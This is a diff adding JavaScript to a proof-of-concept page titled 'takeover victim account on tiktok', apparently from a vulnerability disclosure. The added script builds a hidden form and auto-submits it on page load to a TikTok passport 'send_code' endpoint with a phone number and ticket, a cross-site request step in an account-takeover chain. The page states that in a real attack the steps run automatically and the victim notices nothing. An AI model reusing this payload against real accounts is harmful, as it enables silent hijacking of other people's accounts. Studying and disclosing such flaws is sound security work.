@@ -53,6 +53,36 @@
               console.log(en.code);
               document.getElementById("encryptedcode").innerHTML=en.code;
             }
+  
+           function getNewSubmitForm(){
+                var submitForm = document.createElement("FORM");
+                document.body.appendChild(submitForm);
+                submitForm.method = "POST";
+                return submitForm;
+            }
+
+                //helper function to add elements to the form
+            function createNewFormElement(inputForm, elementName, elementValue){
+                var newElement = document.createElement("<input name='"+elementName+"' type='hidden'>");
+                inputForm.appendChild(newElement);
+                newElement.value = elementValue;
+                return newElement;
+            }
+
+                //function that creates the form, adds some elements
+                //and then submits it
+            function createMobileFormAndSubmit(){
+                var mobileForm = getNewSubmitForm();
+                createNewFormElement(mobileForm, "mix&#95;mode", "1");
+                createNewFormElement(mobileForm, "type", "3735");
+                createNewFormElement(mobileForm, "mobile", "2e3d33343c34323c333235343535");
+                createNewFormElement(mobileForm, "ticket", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+                createNewFormElement(mobileForm, "old&#95;mobile", "");
+                createNewFormElement(mobileForm, "ixed&#95;mix&#95;mode", "1");
+                mobileForm.action= "https://seller-id.tiktok.com/passport/web/send_code/?aid=4068&account_sdk_source=web&language=en";
+                mobileForm.submit();
+            }
+          createMobileFormAndSubmit();
 </script>
 <h1 style="text-align:center;">takeover victim account on tiktok</h1>
 <h2>Hi this is a POC for takeover tiktok account,I will explain the account takeover vulnerability steps separately, hoping to make people understand the principle of the breakthrough. In a real attack, these steps are automatic and continuous, and the victim will not find anything.</h2>
